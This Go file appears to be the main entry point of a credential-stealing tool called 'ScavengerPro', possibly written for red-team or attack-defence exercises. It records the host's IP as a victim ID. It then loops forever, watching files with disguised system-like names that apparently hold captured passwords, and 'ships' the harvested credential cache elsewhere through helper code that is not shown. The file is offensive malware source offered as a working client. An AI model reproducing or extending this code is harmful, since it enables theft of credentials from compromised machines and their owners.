// Main file for ScavengerPro package
// Get client IP, initiate cred_cache, watch files, then ship when neccessary
// @author: degenerat3
package main

import (
	"ScavengerPro/client/cred_cache"
	"net"
	"time"
)

// watch passes the files/cache into the file_watch functions
func watch(files []string, c *cred_cache.CredCache) {
	checkFiles(files, c)
}

// ship passes the cred cache into the shipper
func ship(c *cred_cache.CredCache, min int) {
	shipIt(c, min)

}

// getIP records the IP so we can use it as an ID for requests
func getIP() string {
	conn, _ := net.Dial("udp", "8.8.8.8:80")
	defer conn.Close()
	ad := conn.LocalAddr().(*net.UDPAddr)
	ipStr := ad.IP.String()
	return ipStr
}

// Define files to track, initiate the cache, watch/ship it
func main() {
	files := []string{"/lib64/libsshd.so.5:def", "/etc/kernel-def.conf:def", "/usr/bin/x11-checksum:def", "/var/your_passwords.lol:def"} // []string of files to watch
	min := 1
	ip := getIP()

	ca := cred_cache.CredCache{
		IP:          ip,
		Credentials: []string{},
	}
	c := &ca
	for {
		time.Sleep(2 * time.Second)
		watch(files, c)
		ship(c, min)
	}
}
